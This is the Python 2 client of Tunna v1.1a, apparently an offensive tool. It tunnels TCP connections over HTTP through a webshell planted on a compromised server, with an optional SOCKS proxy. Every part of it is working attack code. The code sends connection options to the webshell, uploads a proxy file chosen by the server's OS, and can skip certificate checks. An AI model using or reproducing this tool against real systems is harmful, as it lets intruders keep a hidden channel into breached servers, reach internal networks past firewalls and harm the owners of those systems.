#Tunna v1.1a
import select
import urllib2, ssl
import cookielib
import gzip, zlib, StringIO
from time import time, sleep, asctime
import threading, thread
import socket
import getopt, sys, os
import random,string

from SocksClient import SocksClient

DEBUG=0

class TunnaClient():
	def __init__(self,options):
		self.options=options
		self.url = options['url']+"?proxy"
		self.local_port = options['local_port']
		remote_port = options['remote_port']
		self.bufferSize = options['bufferSize']
		self.penalty=0
		self.ptc=threading.Condition()	#PingingThread wait for condition
		#init options
		remote_ip = options['remote_ip']
		self.ping_delay = options['ping_delay']
		self.start_p_thread = options['start_p_thread']
		self.verbose = options['verbose']
		try:
			#init tunnel
			self.http=self.HTTPwrapper(self.url,self.options)
			self.mutex_http_req = threading.Lock()
			pings=0
		except Exception, e:
			print "[-]",e
			print "[-] Error Setting Up Tunnel"
			raise
		sleep(1)

	def init_ping_thread(self,start=False):	#Initialise thread
		self.pt = threading.Thread(name='ping', target=self.Pinging_Thread, args=())
		self.pt.setDaemon(1)				#will exit if main exits
		if start:
			self.start_p_thread = True
			self.pt.start()

	def Pinging_Thread(self):
		print "[+] Starting Ping thread"
		#self.ptc=threading.Condition()
		wait=True
		p=0.1
		while 1:							#loop forever
			if wait and (self.ping_delay > 0):
				self.ptc.acquire()
				self.ptc.wait(self.ping_delay+self.penalty)		#send ping to server interval + penalty
				self.ptc.release()

			self.mutex_http_req.acquire()		#Ensure that the other thread is not making a request at this time
			try:
				resp_data=self.http.HTTPreq(self.url,"")	#Read response
				if self.verbose: self.http.v_print(pings_n=1)
				if self.penalty<60: self.penalty+=p	#Don't wait more than a minute

				if resp_data:								#If response had data write them to socket
					self.penalty=0
					if self.verbose: self.http.v_print(received_d_pt=len(resp_data))
					self.TunnaSocket.send(resp_data)		#write to socket
					resp_data=""							#clear data
					wait=False								#If data received don't wait
				else:
					wait=True
			except:
				self.TunnaSocket.close()
				thread.exit()
			finally:
				self.mutex_http_req.release()
		print "[-] Pinging Thread Exited"
		#Unrecoverable
		thread.interrupt_main()		#Interupt main thread -> exits

	def startIfProxy(self):
		forceProxy=True
		print "[+] Checking for proxy:",self.http.hasProxy
		if self.http.hasProxy and self.options['useSocks']:
			#If has proxy bind Tunna to random port & Proxy to Local_port
			self.event=threading.Event() 	#Receives Event when SocksClient is ready
			self.event.clear()

			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.server.bind((self.options['bind'],0))

			print "[+] Starting Socket Server"
			S=SocksClient(self.local_port)

			SocksThread = threading.Thread(name='SocksThread', target=S.connect, args=(self.server.getsockname()[1],self.event))
			SocksThread.setDaemon(1)				#will exit if main exits
			SocksThread.start()
		else:
			#Else bind Tunna to local_port
			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.server.bind((self.options['bind'],self.local_port))

	def run(self):
		self.data=''
		self.startIfProxy()
		sockets = [self.server]

		if hasattr(self, 'event'):
			self.event.set()
		self.server.listen(0)

		while True:
			inputready,outputready,exceptready = select.select(sockets,[],[])

			for s in inputready:
				if s == self.server: # Accept client connections
					if hasattr(self, 'TunnaSocket'): 	# Only TunnaClient Should connect to the SocksClient
						t,a= self.server.accept()
						t.close							# Drop the connection
					else:
						self.TunnaSocket, address = self.server.accept()
						self.init_ping_thread(self.start_p_thread)
						print "[T] Connected To Socks: ", self.TunnaSocket.getpeername()
						sockets.append(self.TunnaSocket)

				elif s == self.TunnaSocket:	# Receive response
					self.data = self.TunnaSocket.recv(self.bufferSize)	#Read socket
					if len(self.data)==0:
						print "[-] Client Disconnected"
						self.TunnaSocket.close()
						sockets.remove(self.TunnaSocket)
						self.handle_close()

					if self.data:						#If data send them over HTTP (post)
						self.mutex_http_req.acquire()	#Ensure that the other thread is not making a request at this time

						if self.start_p_thread == False:	#Starts pinging thread (Will only run after first data is read from socket)
							self.start_p_thread = True
							self.pt.start()

						try:
							if self.verbose: self.http.v_print(sent_d=len(self.data))
							resp_data=self.http.HTTPreq(self.url,self.data)		#send data with a HTTP post
							if resp_data:							#If data is received back write them to socket
								if self.verbose: self.http.v_print(received_d=len(resp_data))
								self.TunnaSocket.send(resp_data)				#Write data to socket
								resp_data=""						#clear data
						except socket.error, (errno, e):
							self.TunnaSocket.close()
						finally:
							self.mutex_http_req.release()
							#if self.penalty > 0:
							self.penalty=0
							#if data: stop pingThread wait
							self.ptc.acquire()
							self.ptc.notify()		#send ping to server interval
							self.ptc.release()

			for s in exceptready: #TODO?
				print "[-] Unhandled Socket Exception"

	def handle_close(self):			#Client disconnected
		thread.interrupt_main()

	def __del__(self):
		if hasattr(self, 'pt'):
				self.pt._Thread__stop()	#Stop socket thread and exit
		if hasattr(self, 'http'):
			print self.http.HTTPreq(self.url+"&close")
			self.http.__del__()
		print "[-] Disconnected"

	class HTTPwrapper:
		cj = cookielib.CookieJar()
		hasProxy=False
		needsFile=False
		def __init__(self, url , options):
			self.options=options
			remote_ip = options['remote_ip']
			remote_port = options['remote_port']
			verbose = options['verbose']
			self.cookie = options['cookie']
                        self.bauth = options['bauth']

			self.url=url

			if verbose:
				self.send=0
				self.received=0
				self.received_pt=0
				self.pings=0
			try:
				self.buildOpener()
				#Initial Request to get the cookie/options
				resp=str(self.HTTPreq(self.url))
				if self.options['useSocks']:
					if "[PROXY]" in resp:
						self.hasProxy=True
					elif "[FILE]" in resp:
						print "[+] Sending File"
						self.hasProxy=True
						if "[WIN]" in resp:
							(headers,data)=self.multipart_upload_file(self.options['ProxyFileWin'])
							print self.HTTPreq((self.url+"&file&upload"),data,headers)
						elif "[LINUX]" in resp:
							(headers,data)=self.multipart_upload_file(self.options['ProxyFilePy'])
							print self.HTTPreq((self.url+"&file&upload"),data,headers)
						else:
							print "[-] Unknown server OS"

				#2nd request: send connection options to webshell - In php this thread will stall
				self.t = threading.Thread(target=self.Threaded_request, args=(remote_port,remote_ip,self.options['useSocks']))
				self.t.start()		#start the thread

			except Exception, e:
				print "[-] Error:",e
				thread.interrupt_main()
			sleep(2)

		def buildOpener(self):
			handler=[urllib2.HTTPCookieProcessor(self.cj)]
			if self.options['upProxy']:# in self.options:
				if self.options['upProxyAuth']:# in self.options:
					for h in self.options['upProxyAuth']:
						handler.append(h)
				else:
					if 'http://' in self.options['upProxy']:
						handler.append(urllib2.ProxyHandler({'http':self.options['upProxy']}))
					else:
						handler.append(urllib2.ProxyHandler({'https':self.options['upProxy']}))

			if self.options['ignoreServerCert']:
				ctx = ssl.create_default_context()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				handler.append(urllib2.HTTPSHandler(context=ctx))

			opener = urllib2.build_opener(*handler)

			opener.addheaders = [('Accept-encoding', 'gzip')]
			self.opener = opener

		def HTTPreq(self,url,data=None,headers=None):
			opener=self.opener

			kargs={}
			kargs['url']=url
			if data:  kargs['data']=data	#Will do a GET if no data else POST
			if headers:  kargs['headers']=headers
			else: kargs['headers']={'Content-Type':'application/octet-stream'}

                        if self.options['cookie']:
                            kargs['headers'].update({'Cookie':self.cookie})

			if self.options['bauth']:
                            kargs['headers'].update({'Authorization': "Basic %s" % self.bauth})

			#Make Request
			f=opener.open(urllib2.Request(**kargs))

			#If response is gzip encoded
			if ('Content-Encoding' in f.info().keys() and f.info()['Content-Encoding']=='gzip') or \
				('content-encoding' in f.info().keys() and f.info()['content-encoding']=='gzip'):
				url_f = StringIO.StringIO(f.read())
				data = gzip.GzipFile(fileobj=url_f).read()
			else:	#response not encoded
				data = f.read()

			if f.getcode() != 200:
				print "[-] Received status code " + str(f.getcode())
				print data
				thread.interrupt_main()
			return  data	#Return response

		def Threaded_request(self, remote_port,remote_ip=None, socks=True):
			#Sends connection options to the webshell
			#In php this thread will stall to keep the connection alive (will not receive response)
			#In other webshells [OK] is received

			print '[+] Spawning keep-alive thread'
			#set up options
			url=self.url+"&port="+str(remote_port)
			if remote_ip:	url+="&ip="+str(remote_ip)
			if socks: 		url+="&socks"
			#send options
			resp = self.HTTPreq(url)

			if (resp[:4] == '[OK]'):	#If ok is received (non-php webshell): Thread not needed
				print '[-] Keep-alive thread not required'
			else:					#if ok/proxy is not received something went wrong (if nothing is received: it's a PHP webshell)
				print resp
				print '[-] Keep-alive thread exited'
				thread.interrupt_main()

		def multipart_upload_file(self,filename):
			rand = ''.join([random.choice("0123456789") for i in range(10)])	#random_string (10)

			tmpFilename=rand[:3]+'-'+os.path.basename(filename)

			headers={'Content-Type':('multipart/form-data; boundary=---------------------------%s' % rand)}

			data ='-----------------------------'+rand+													\
				'\r\nContent-Disposition: form-data; name=\"proxy\"; filename=\"'+tmpFilename		\
				+'\"\r\nContent-Type: application/octet-stream\r\n\r\n'+(open(filename,'rb').read())	\
				+'\r\n-----------------------------'+rand+'--\r\n\r\n'

			return headers,data

		def v_print(self, sent_d=0, received_d=0, received_d_pt=0,pings_n=0):	#Verbose output for Debugging
			self.send
			self.received
			self.received_pt
			self.pings

			self.send+=sent_d
			self.received+=received_d
			self.received_pt+=received_d_pt
			self.pings+=pings_n

			if sys.platform.startswith('win') or sys.platform == 'cygwin':
				os.system("cls")
			else:
				os.system("clear")
			sys.stdout.write(
				"Received Data: %d (%d)\nReceived Data From Ping Thread: %d (%d) \nSent data: %d (%d) \nPings sent: %d\r\n"
				% (self.received,received_d, self.received_pt,received_d_pt, self.send, sent_d, self.pings) )
			sys.stdout.flush()

		def __del__(self):
			if hasattr(self, 't') and self.t.isAlive:self.t._Thread__stop()

